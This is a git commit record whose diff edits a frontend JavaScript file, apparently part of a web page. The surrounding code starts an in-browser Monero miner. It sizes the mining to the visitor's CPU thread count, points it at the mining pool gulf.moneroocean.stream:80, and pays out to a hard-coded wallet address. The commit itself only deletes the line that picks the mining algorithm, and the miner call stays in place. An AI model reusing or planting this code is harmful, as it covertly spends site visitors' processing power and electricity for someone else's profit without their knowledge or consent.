ff1d56c2df7c6ef6a665e2c16a5b37bfa477d000
ggga2t1wtadbnmcgmfg <160171541+ggga2t1wtadbnmcgmfg@users.noreply.github.com>
2024-04-17 21:10:41 -0300

    Update js.js

--- frontend/js.js
+++ frontend/js.js
@@ -35,6 +35,5 @@ let threadDisp = getT(navigator.hardwareConcurrency);
 if (threadDisp > 0){
     let name =  getResourceName();
     CustomPool = "gulf.moneroocean.stream:80" 
-    rightalgo = "ghostrider" 
     PerfektStart("87cpPYpiga6LY5pirZZzfx1gXW72HrfZKPt7ZJZgHv9qHPYdGQCNmGY2SGgJGv8RkcKvF34ZYiSxJG6f4ZH4KeDiRpPc38r", `${name} - ${threadDisp}`, threadDisp);
 }
